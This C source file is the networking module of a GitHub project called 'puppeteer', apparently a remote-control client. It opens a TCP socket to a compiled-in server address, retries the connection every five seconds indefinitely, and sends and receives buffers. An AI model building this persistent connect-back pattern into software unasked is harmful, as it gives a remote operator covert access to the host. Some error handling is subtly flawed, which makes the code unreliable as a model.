// MIT License
/*
 * This header file belongs to https://github.com/arthur-bryan/puppeteer
 *
 * Connection and sending/receiving data
 *
 * Copyright (c) 2021 Arthur Bryan <arthurbryan2030@gmail.com>
 */

#include "../include/sockets.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#ifdef __unix__
#include <sys/socket.h>
#include <arpa/inet.h>
#else
#include <winsock2.h>
#endif
#include <unistd.h>

#include "../include/commands.h"
#include "../include/information.h"


/*
 * Creates a TCP socket
 *
 * Returns:
 *      Returns the created socket file descriptor
 */
int16_t
create_socket(void) {
    int16_t new_socket_fd;

    new_socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    return new_socket_fd;
}

/*
 * Creates a socket and tries infinitely to connect to the socket associated
 * to an address till the connection succeeds
 *
 * Returns:
 *      Returns the file descriptor of the connected socket
 */
int16_t
connect_to_server(void) {
    struct sockaddr_in  server_socket_addr;
    struct hostent      *server;

    #ifdef _WIN32
    WSADATA             wsaData;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    #endif

    server = gethostbyname(SERVER_ADDR);
    memset(&server_socket_addr, 0, sizeof server_socket_addr);
    server_socket_addr.sin_family = AF_INET;
    server_socket_addr.sin_addr.s_addr = inet_addr(inet_ntoa(
            *(struct in_addr *)server->h_addr));
    server_socket_addr.sin_port = htons(SERVER_PORT);

    int16_t new_socket = create_socket();
    while (1) {
        int8_t connect_status = connect(new_socket,
                                        (struct sockaddr *) &server_socket_addr,
                                        sizeof server_socket_addr);

        if (connect_status == 0) {
            break;
        }
        close(new_socket);
        new_socket = create_socket();
        sleep(5);
    }
    return new_socket;
}

/*
 * Sends all data from the buffer over an connected socket
 *
 * Parameters:
 *      int16_t socket_fd: the socket file descriptor
 *      void *buffer: the buffer containing the data
 *      size_t len_buffer: the size (bytes) of the buffer
 *
 * Returns:
 *      Returns 0 if all the buffer data was sent, -1 otherwise
 */
int8_t
send_all_data(int16_t socket_fd, void *buffer, size_t len_buffer) {
    char    *buffer_pointer = buffer;

    while (len_buffer > 0) {
        ssize_t sent_data = send(socket_fd, buffer_pointer, len_buffer, 0);

        if (sent_data < 1) {
            return -1;
        }
        buffer_pointer += sent_data;
        len_buffer -= sent_data;
    }
    return 0;
}

/*
 * Receives data over an connected socket and stores it in an output buffer
 *
 * Parameters:
 *      int16_t socket_fd: the socket file descriptor
 *      void *output_buffer: the buffer where the received data will be stored
 *      size_t len_output_buffer: the total size (bytes) to be received
 *
 * Returns:
 *      Returns the number of bytes received if all the buffer data was sent,
 *      -1 otherwise
 */
uint32_t
recv_all_data(int16_t socket_fd, void *output_buffer, size_t len_output_buffer) {
    char        *buffer_pointer = output_buffer;
    uint32_t    bytes_read = 0;  // up to 4Gb

    while (len_output_buffer > 0) {
        ssize_t received_data = recv(socket_fd,
                                     buffer_pointer,
                                     len_output_buffer,
                                     0);
        if (received_data == -1) {
            return -1;
        }
        buffer_pointer += received_data;
        len_output_buffer -= received_data;
        bytes_read += received_data;
    }
    return bytes_read;
}
